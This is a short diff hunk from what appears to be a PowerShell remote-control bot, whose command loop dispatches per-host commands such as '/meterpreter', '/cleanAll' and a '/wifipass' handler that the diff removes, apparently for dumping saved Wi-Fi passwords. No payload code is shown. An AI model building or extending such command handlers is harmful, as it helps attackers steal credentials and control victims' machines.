@@ -704,9 +704,6 @@ While ($DoNotExit)  {
       "/meterpreter $ipV4"  {
          
       }
-      "/wifipass $ipV4" {
-        wifipass
-      }
       "/cleanAll $ipV4" {
         cleanAll
       }
